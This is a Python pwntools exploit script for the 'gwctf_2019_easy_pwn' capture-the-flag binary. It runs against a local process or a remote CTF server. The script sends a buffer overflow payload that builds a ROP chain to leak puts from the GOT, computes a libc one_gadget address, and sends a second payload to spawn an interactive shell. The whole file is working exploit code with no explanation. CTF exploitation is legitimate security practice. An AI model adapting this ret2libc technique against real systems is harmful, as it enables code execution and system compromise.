import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./gwctf_2019_easy_pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./gwctf_2019_easy_pwn')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28183)
			elf=ELF('./gwctf_2019_easy_pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		

		puts_plt=0x8048DC0
		puts_got=0x804C068
		main=0x8049091
		pl='I'*16+p32(puts_plt)+p32(main)+p32(puts_got)
		io.send(pl)
		io.recvuntil('pretty'*16)
		io.recv(12)
		puts_add=u32(io.recv(4))
		print(hex(puts_add))
		one_gadget=puts_add-0x05f140+0x5f066
		#sys=puts_add-0x24800
		#sh=puts_add+0xf9eeb
		#pl2='I'*16+p32(sys)+'dead'+p32(sh)
		pl2='I'*16+p32(one_gadget)
		io.send(pl2)


		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue